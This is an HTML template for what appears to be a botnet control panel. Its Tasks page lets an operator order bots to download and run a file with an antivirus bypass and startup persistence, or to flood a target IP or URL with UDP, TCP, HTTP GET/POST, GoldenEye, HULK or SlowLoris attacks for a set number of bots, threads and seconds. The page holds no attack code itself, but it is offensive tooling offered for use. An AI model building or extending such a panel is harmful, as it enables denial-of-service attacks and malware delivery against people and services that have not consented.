<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>{{ .title }}</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/css/lightbox.min.css">
    <link rel="stylesheet" href="assets/css/styles.min.css">
</head>

<body style="background-image: url(&quot;assets/img/wallpaperflare.com_wallpaper.jpg&quot;);background-size: cover;background-repeat: no-repeat;"><div class="sidebar">
  <a href="news">News</a>
  <a href="bots">Bots</a>
  <a href="tasks">Tasks</a>
  <a href="logout">User</a>
</div>
    <div style="padding-left: 250px;padding-right: 50px;padding-top: 50px;padding-bottom: 50px;">
        <div class="card">
            <div class="card-header">
                <h5 class="mb-0">Tasks</h5>
            </div>
            <div class="card-body">
                <div class="container">
                    <div class="row" style="width: 1000px;">
                        <div class="col-md-8">
                            <div class="table-responsive">
                                <table class="table">
                                    <thead>
                                        <tr>
                                            <th>Task type</th>
                                            <th>Parameters</th>
                                            <th>Rate</th>
                                        </tr>
                                    </thead>
                                    <tbody></tbody>
                                </table>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="row" style="width: 450px;">
                                <div class="col-md-12"><span>Tast type:&nbsp;</span><select style="height: 30px;" onchange="CheckValue(this.value);"><option selected>Select Task</option><optgroup label="Execution"><option value="1">Simple Execution</option><option value="2">Execution &amp; Add to startup</option><option value="3">Execution (AV Bypass)</option><option value="4">Execution &amp; Add to startup (AV Bypass)</option></optgroup><optgroup label="Layer 4"><option value="5">UDP</option><option value="6">TCP</option></optgroup><optgroup label="Layer 7"><option value="7">HTTP GET</option><option value="8">HTTP POST</option><option value="9">GoldenEye</option><option value="10">HULK</option><option value="11">SlowLoris</option></optgroup></select></div>
                                <div class="col-md-12" id="file" style="margin-top: 15px;"><span>File Address:&nbsp;</span><input type="text" placeholder="http://google.com/text.exe" name="dst" style="width: 297px;"></div>
                                <div class="col-md-12" id="layer4" style="margin-top: 15px;"><span>IP:PORT:&nbsp;</span><input type="text" placeholder="1.1.1.1:254" name="dst" style="width: 327px;"></div>
                                <div class="col-md-12" id="layer7" style="margin-top: 15px;"><span>Address:&nbsp;</span><input type="text" placeholder="http://(https://)google.com" name="dst" style="width: 326px;"></div>
                                <div class="col-md-12" id="thread" style="margin-top: 15px;"><span>Thread:&nbsp;</span><input type="text" placeholder="300" name="thread" style="width: 335px;"></div>
                                <div class="col-md-12" id="time" style="margin-top: 15px;"><span>Time:&nbsp;</span><input type="text" placeholder="60 (Seconds)" name="time" style="width: 350px;"></div>
                                <div class="col-md-12" style="margin-top: 15px;"><span>Num of Exec:&nbsp;</span><input type="text" placeholder="100 (bots, 0 for Everybot)" name="time" style="width: 295px;"></div>
                                <div class="col-md-12 text-right" style="margin-top: 15px;padding-right: 42px;"><button class="btn btn-primary" type="button" style="background-color: rgb(255,136,69);">Run</button></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/js/lightbox.min.js"></script>
    <script src="assets/js/script.min.js"></script>
</body>

</html>
